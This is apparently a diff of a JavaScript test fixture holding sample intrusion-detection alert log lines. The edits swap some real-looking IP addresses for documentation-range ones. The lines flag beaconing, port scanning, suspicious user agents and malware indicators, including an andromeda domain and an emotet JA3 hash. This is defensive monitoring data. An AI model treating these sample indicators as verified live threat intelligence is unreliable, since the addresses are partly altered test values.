-    '"2024-01-11 12:50:31.721745" r2d2 10.3.160.42 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:50:31.721745" r2d2 10.3.160.42 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:50:43.660998" r2d2 2.200.105.140 23960 2.23.97.208 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:51:35.155935" r2d2 8.8.8.8 53 2.200.109.177 46589 UDP DNS (610warren).com "parked site (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:51:35.155943" r2d2 8.8.8.8 53 2.200.109.177 46589 UDP DNS (610warren).com "parked site (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:51:47.502118" r2d2 10.124.72.51 1143 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
-    '"2024-01-11 12:52:01.307019" r2d2 2.200.104.32 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 12:52:01.307019" r2d2 10.128.8.51 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
     '"2024-01-11 12:52:02.483759" r2d2 2.200.107.146 30485 194.169.218.42 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 12:52:13.451134" r2d2 10.3.160.42 6421 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:52:18.530199" r2d2 10.1.192.180 80 10.2.23.19 56832 TCP HTTP application/x-sh "content type (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:52:20.806936" r2d2 10.9.28.51 60373 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 12:53:32.450684" r2d2 10.2.120.16 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:53:32.450684" r2d2 10.43.192.103 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:53:33.000004" r2d2 2.200.108.59 24762,24763,24766,24768,24771,24772,24781,33106,33172,33902,34074,34482,34918,35230,36548,36655,36658,36992,37506,37532,38862,39010,39378,40792,41356,41394,41512,41554,41590,41700,42584,42852,43262,43560,43708,44614,45876,46096,46486,47404,47712,47776,48140,48638,49256,49444,50010,50460,50968,51844,53770,54138,55666,56898,58362,58838,59180,59450,59462,60316,60356,60498,60642 77.53.81.105 21,6079,7239,9023,9337,11471,11687,12517,13619,14130,14969,16996,17508,19398,19404,21723,22084,23521,23706,25829,28179,29633,29638,32705,35421,35890,38452,42716,44093,44539,45026,46848,47238,49597,49609,50077,50896,52023,54256,54772,55794,56361,56838,57114,58273,58283,58607,60726,60887,61371,61489,62463,63691,64986 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 12:54:13.546878" r2d2 10.3.160.42 6422 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:54:59.567812" r2d2 178.17.174.14 47812 2.200.109.24 80 TCP UA "FunWebProducts (Mozilla/4.0 \\(compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; FunWebProducts; GTB7.5; .NET CLR 1.1.4322; AskTbPGL/5.15.4.23821; .NET CLR 2.0.50727\\))" "user agent (suspicious)" (heuristic)\n' +
